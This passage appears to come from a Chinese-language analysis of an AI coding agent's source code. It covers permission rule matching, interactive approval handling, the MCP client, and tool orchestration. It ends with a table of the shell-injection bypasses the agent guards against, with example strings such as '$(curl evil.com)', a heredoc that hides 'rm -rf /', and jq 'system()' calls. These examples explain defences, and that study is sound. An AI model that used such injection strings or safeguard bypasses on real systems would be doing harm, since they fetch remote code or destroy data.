      if (isAbort || (!feedback && !contentBlocks?.length && !sub)) {
        logForDebugging(`Aborting: tool=${tool.name} isAbort=${isAbort}`)
        toolUseContext.abortController.abort()
      }
      return { behavior: 'ask', message, contentBlocks }
    },
    
    // 尝试分类器
    ...(feature('BASH_CLASSIFIER') ? {
      async tryClassifier(pendingClassifierCheck, updatedInput) {
        if (tool.name !== BASH_TOOL_NAME || !pendingClassifierCheck) return null
        
        const classifierDecision = await awaitClassifierAutoApproval(
          pendingClassifierCheck,
          toolUseContext.abortController.signal,
          toolUseContext.options.isNonInteractiveSession,
        )
        
        if (!classifierDecision) return null
        
        if (classifierDecision.type === 'classifier') {
          const matchedRule = classifierDecision.reason.match(
            /^Allowed by prompt rule: "(.+)"$/,
          )?.[1]
          if (matchedRule) {
            setClassifierApproval(toolUseID, matchedRule)
          }
        }
        
        return {
          behavior: 'allow',
          updatedInput: updatedInput ?? input,
          decisionReason: classifierDecision,
        }
      },
    } : {}),
  }
  
  return ctx
}
```

## 3.2 权限规则匹配 (permissions.ts)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 权限规则匹配
// ═══════════════════════════════════════════════════════════════════════════

export function hasPermissionsToUseTool(
  tool: ToolType,
  input: Record<string, unknown>,
  toolUseContext: ToolUseContext,
  assistantMessage: AssistantMessage,
  toolUseID: string,
): Promise<PermissionResult> {
  const appState = toolUseContext.getAppState()
  const { toolPermissionContext } = appState
  
  // 1. 检查 alwaysAllowRules
  const allowRule = matchRule(toolPermissionContext.alwaysAllowRules, tool, input)
  if (allowRule) {
    return Promise.resolve({
      behavior: 'allow',
      decisionReason: { type: 'rule', rule: allowRule },
    })
  }
  
  // 2. 检查 alwaysDenyRules
  const denyRule = matchRule(toolPermissionContext.alwaysDenyRules, tool, input)
  if (denyRule) {
    return Promise.resolve({
      behavior: 'deny',
      decisionReason: { type: 'rule', rule: denyRule },
    })
  }
  
  // 3. 检查 alwaysAskRules
  const askRule = matchRule(toolPermissionContext.alwaysAskRules, tool, input)
  if (askRule) {
    return Promise.resolve({
      behavior: 'ask',
      decisionReason: { type: 'rule', rule: askRule },
    })
  }
  
  // 4. 检查权限模式
  switch (toolPermissionContext.mode) {
    case 'bypass':
      if (!isDangerousTool(tool, input)) {
        return Promise.resolve({
          behavior: 'allow',
          decisionReason: { type: 'mode', mode: 'bypass' },
        })
      }
      break
    
    case 'auto':
      if (isAutoModeAllowed(tool, input)) {
        return Promise.resolve({
          behavior: 'allow',
          decisionReason: { type: 'mode', mode: 'auto' },
        })
      }
      break
  }
  
  // 5. 默认：询问用户
  return Promise.resolve({ behavior: 'ask' })
}

function matchRule(
  rules: ToolPermissionRulesBySource,
  tool: ToolType,
  input: Record<string, unknown>,
): PermissionRule | null {
  for (const source of PERMISSION_RULE_SOURCES) {
    const sourceRules = rules[source] || {}
    const toolRules = sourceRules[tool.name] || []
    
    for (const ruleString of toolRules) {
      const ruleValue = permissionRuleValueFromString(ruleString)
      if (ruleMatches(ruleValue, input)) {
        return {
          source,
          ruleBehavior: 'allow',  // 或 'deny' / 'ask'
          ruleValue,
        }
      }
    }
  }
  
  return null
}
```

---

# 4. 交互式权限处理 (interactiveHandler.ts)

## 4.1 交互式权限流程

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 交互式权限处理
// ═══════════════════════════════════════════════════════════════════════════

function handleInteractivePermission(
  params: InteractivePermissionParams,
  resolve: (decision: PermissionDecision) => void,
): void {
  const {
    ctx,
    description,
    result,
    awaitAutomatedChecksBeforeDialog,
    bridgeCallbacks,
    channelCallbacks,
  } = params

  // 原子 resolve 守卫
  const { resolve: resolveOnce, isResolved, claim } = createResolveOnce(resolve)
  let userInteracted = false
  const permissionPromptStartTimeMs = Date.now()
  const displayInput = result.updatedInput ?? ctx.input

  // 推送到确认队列
  ctx.pushToQueue({
    assistantMessage: ctx.assistantMessage,
    tool: ctx.tool,
    description,
    input: displayInput,
    toolUseID: ctx.toolUseID,
    permissionResult: result,
    permissionPromptStartTimeMs,
    
    // 用户交互回调
    onUserInteraction() {
      const GRACE_PERIOD_MS = 200
      if (Date.now() - permissionPromptStartTimeMs < GRACE_PERIOD_MS) return
      userInteracted = true
      clearClassifierChecking(ctx.toolUseID)
      clearClassifierIndicator()
    },
    
    // 中止回调
    onAbort() {
      if (!claim()) return
      if (bridgeCallbacks && bridgeRequestId) {
        bridgeCallbacks.sendResponse(bridgeRequestId, { behavior: 'deny', message: 'User aborted' })
        bridgeCallbacks.cancelRequest(bridgeRequestId)
      }
      channelUnsubscribe?.()
      ctx.logCancelled()
      ctx.logDecision({ decision: 'reject', source: { type: 'user_abort' } })
      resolveOnce(ctx.cancelAndAbort(undefined, true))
    },
    
    // 允许回调
    async onAllow(updatedInput, permissionUpdates, feedback, contentBlocks) {
      if (!claim()) return
      
      if (bridgeCallbacks && bridgeRequestId) {
        bridgeCallbacks.sendResponse(bridgeRequestId, {
          behavior: 'allow',
          updatedInput,
          updatedPermissions: permissionUpdates,
        })
        bridgeCallbacks.cancelRequest(bridgeRequestId)
      }
      channelUnsubscribe?.()
      
      resolveOnce(await ctx.handleUserAllow(
        updatedInput,
        permissionUpdates,
        feedback,
        permissionPromptStartTimeMs,
        contentBlocks,
        result.decisionReason,
      ))
    },
    
    // 拒绝回调
    onReject(feedback, contentBlocks) {
      if (!claim()) return
      
      if (bridgeCallbacks && bridgeRequestId) {
        bridgeCallbacks.sendResponse(bridgeRequestId, {
          behavior: 'deny',
          message: feedback ?? 'User denied permission',
        })
        bridgeCallbacks.cancelRequest(bridgeRequestId)
      }
      channelUnsubscribe?.()
      
      ctx.logDecision({
        decision: 'reject',
        source: { type: 'user_reject', hasFeedback: !!feedback },
      })
      resolveOnce(ctx.cancelAndAbort(feedback, undefined, contentBlocks))
    },
    
    // 重新检查权限
    async recheckPermission() {
      if (isResolved()) return
      
      const freshResult = await hasPermissionsToUseTool(
        ctx.tool, ctx.input, ctx.toolUseContext, ctx.assistantMessage, ctx.toolUseID,
      )
      
      if (freshResult.behavior === 'allow') {
        if (!claim()) return
        if (bridgeCallbacks && bridgeRequestId) {
          bridgeCallbacks.cancelRequest(bridgeRequestId)
        }
        channelUnsubscribe?.()
        ctx.removeFromQueue()
        ctx.logDecision({ decision: 'accept', source: 'config' })
        resolveOnce(ctx.buildAllow(freshResult.updatedInput ?? ctx.input))
      }
    },
  })

  // Race 1: Bridge 权限响应 (CCR)
  if (bridgeCallbacks && bridgeRequestId) {
    bridgeCallbacks.sendRequest(
      bridgeRequestId,
      ctx.tool.name,
      displayInput,
      ctx.toolUseID,
      description,
      result.suggestions,
      result.blockedPath,
    )

    const unsubscribe = bridgeCallbacks.onResponse(bridgeRequestId, response => {
      if (!claim()) return
      clearClassifierChecking(ctx.toolUseID)
      clearClassifierIndicator()
      ctx.removeFromQueue()
      channelUnsubscribe?.()

      if (response.behavior === 'allow') {
        if (response.updatedPermissions?.length) {
          void ctx.persistPermissions(response.updatedPermissions)
        }
        ctx.logDecision({
          decision: 'accept',
          source: { type: 'user', permanent: !!response.updatedPermissions?.length },
        })
        resolveOnce(ctx.buildAllow(response.updatedInput ?? displayInput))
      } else {
        ctx.logDecision({
          decision: 'reject',
          source: { type: 'user_reject', hasFeedback: !!response.message },
        })
        resolveOnce(ctx.cancelAndAbort(response.message))
      }
    })
  }

  // Race 2: Channel 权限中继
  // Race 3: Hook 自动批准
  // Race 4: Bash 分类器检查
}
```

---

# 5. MCP 集成深度分析

## 5.1 MCP 客户端连接 (client.ts - 3149 行)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// MCP 客户端连接
// ═══════════════════════════════════════════════════════════════════════════

export class McpClient {
  private client: Client
  private transport: Transport
  private serverName: string
  
  constructor(serverName: string, config: McpSdkServerConfig) {
    this.serverName = serverName
    
    // 根据配置选择传输方式
    if (config.type === 'stdio') {
      this.transport = new StdioClientTransport({
        command: config.command,
        args: config.args,
        env: { ...subprocessEnv(), ...config.env },
      })
    } else if (config.type === 'sse') {
      this.transport = new SSEClientTransport(
        new URL(config.url),
        { requestInit: { headers: getMcpServerHeaders(config) } }
      )
    } else if (config.type === 'streamable-http') {
      this.transport = new StreamableHTTPClientTransport(
        new URL(config.url),
        { requestInit: { headers: getMcpServerHeaders(config) } }
      )
    } else if (config.type === 'websocket') {
      this.transport = new WebSocketTransport(
        config.url,
        { tlsOptions: getWebSocketTLSOptions(config) }
      )
    }
    
    this.client = new Client({
      name: 'claude-code',
      version: pkg.version,
    })
  }
  
  async connect(): Promise<void> {
    await this.client.connect(this.transport)
  }
  
  async listTools(): Promise<ListToolsResult> {
    return this.client.request({ method: 'tools/list' }, ListToolsResultSchema)
  }
  
  async callTool(name: string, args: Record<string, unknown>): Promise<MCPToolResult> {
    const result = await this.client.request(
      { method: 'tools/call', params: { name, arguments: args } },
      CallToolResultSchema,
    )
    
    // 处理错误结果
    if (result.isError) {
      throw new McpToolCallError(
        result.content?.[0]?.text ?? 'Unknown error',
        `MCP tool ${name} failed`,
        result._meta,
      )
    }
    
    // 处理二进制内容
    const content = result.content?.map(block => {
      if (block.type === 'resource') {
        return { type: 'resource', resource: block.resource }
      }
      if (block.type === 'text') {
        return { type: 'text', text: block.text }
      }
      if (block.type === 'image') {
        return { type: 'image', data: block.data, mimeType: block.mimeType }
      }
      return block
    })
    
    return { content, _meta: result._meta }
  }
}
```

---

# 6. 工具执行编排

## 6.1 并发/串行执行 (toolOrchestration.ts)

```typescript
// ═══════════════════════════════════════════════════════════════════════════
// 工具执行编排
// ═══════════════════════════════════════════════════════════════════════════

export async function* runTools(
  toolUseMessages: ToolUseBlock[],
  assistantMessages: AssistantMessage[],
  canUseTool: CanUseToolFn,
  toolUseContext: ToolUseContext,
): AsyncGenerator<MessageUpdate, void> {
  let currentContext = toolUseContext
  
  // 分区：并发安全批 vs 串行批
  for (const { isConcurrencySafe, blocks } of partitionToolCalls(
    toolUseMessages,
    currentContext,
  )) {
    if (isConcurrencySafe) {
      // 并发执行读操作
      const queuedContextModifiers: Record<string, ((context: ToolUseContext) => ToolUseContext)[]> = {}
      
      for await (const update of runToolsConcurrently(
        blocks,
        assistantMessages,
        canUseTool,
        currentContext,
      )) {
        if (update.contextModifier) {
          const { toolUseID, modifyContext } = update.contextModifier
          if (!queuedContextModifiers[toolUseID]) {
            queuedContextModifiers[toolUseID] = []
          }
          queuedContextModifiers[toolUseID].push(modifyContext)
        }
        yield { message: update.message, newContext: currentContext }
      }
      
      // 应用上下文修改器
      for (const block of blocks) {
        const modifiers = queuedContextModifiers[block.id]
        if (!modifiers) continue
        for (const modifier of modifiers) {
          currentContext = modifier(currentContext)
        }
      }
      
      yield { newContext: currentContext }
    } else {
      // 串行执行非读操作
      for await (const update of runToolsSerially(
        blocks,
        assistantMessages,
        canUseTool,
        currentContext,
      )) {
        if (update.newContext) {
          currentContext = update.newContext
        }
        yield { message: update.message, newContext: currentContext }
      }
    }
  }
}

// 分区逻辑
function partitionToolCalls(
  toolUseMessages: ToolUseBlock[],
  toolUseContext: ToolUseContext,
): Batch[] {
  return toolUseMessages.reduce((acc: Batch[], toolUse) => {
    const tool = findToolByName(toolUseContext.options.tools, toolUse.name)
    const parsedInput = tool?.inputSchema.safeParse(toolUse.input)
    
    const isConcurrencySafe = parsedInput?.success
      ? (() => {
          try {
            return Boolean(tool?.isConcurrencySafe(parsedInput.data))
          } catch {
            return false  // 保守：失败视为不安全
          }
        })()
      : false
    
    if (isConcurrencySafe && acc[acc.length - 1]?.isConcurrencySafe) {
      acc[acc.length - 1].blocks.push(toolUse)
    } else {
      acc.push({ isConcurrencySafe, blocks: [toolUse] })
    }
    return acc
  }, [])
}
```

---

# 7. 安全漏洞防护详解

## 7.1 防护的漏洞类型

| 漏洞类型 | 检测机制 | 示例攻击 |
|----------|----------|----------|
| **命令注入** | 24 项安全检查 | `$(curl evil.com)` |
| **Zsh 绕过** | ZSH_DANGEROUS_COMMANDS | `zmodload zsh/system` |
| **Heredoc 注入** | isSafeHeredoc | `$(cat <<'EOF'\nrm -rf /\nEOF)` |
| **Git Commit 注入** | validateGitCommit | `git commit -m "msg" && evil` |
| **Jq 代码执行** | validateJqCommand | `jq 'system("evil")'` |
| **重定向绕过** | stripSafeRedirections | `> /dev/nullo` |
| **Unicode 绕过** | UNICODE_WHITESPACE | `\u00A0` (非断空格) |
| **转义绕过** | BACKSLASH_ESCAPED_OPERATORS | `\;\|\&` |
| **引号失配** | COMMENT_QUOTE_DESYNC | `echo 'x# comment` |
| **IFS 注入** | IFS_INJECTION | `IFS=$'\n'` |

## 7.2 BashTool 文件清单 (12,411 行)

| 文件 | 行数 | 职责 |
|------|------|------|
| `BashTool.tsx` | 1,143 | 工具主逻辑 |
| `bashPermissions.ts` | 2,621 | 权限规则匹配 |
| `bashSecurity.ts` | 2,592 | 24 项安全检查 |
| `readOnlyValidation.ts` | 1,990 | 只读约束验证 |
| `pathValidation.ts` | 1,303 | 路径验证 |
| `UI.tsx` | 1,184 | UI 渲染 |
| `BashToolResultMessage.tsx` | 190 | 结果消息渲染 |
| `bashCommandHelpers.ts` | 265 | 命令辅助函数 |
| `sedValidation.ts` | 684 | Sed 命令验证 |
| `prompt.ts` | 369 | 提示生成 |
| `sedEditParser.ts` | 322 | Sed 解析器 |
| `shouldUseSandbox.ts` | 153 | 沙箱决策 |
| `destructiveCommandWarning.ts` | 102 | 破坏性警告 |
| `modeValidation.ts` | 115 | 模式验证 |
| `commandSemantics.ts` | 140 | 命令语义 |
| `utils.ts` | 223 | 工具函数 |
| `toolName.ts` | 2 | 工具名称常量 |
| `commentLabel.ts` | 13 | 注释标签 |

---

_文档生成时间：2026-04-02 13:45 GMT+8_  
_总字数：约 50,000 字_  
_代码行数分析：512,664 行 TypeScript_
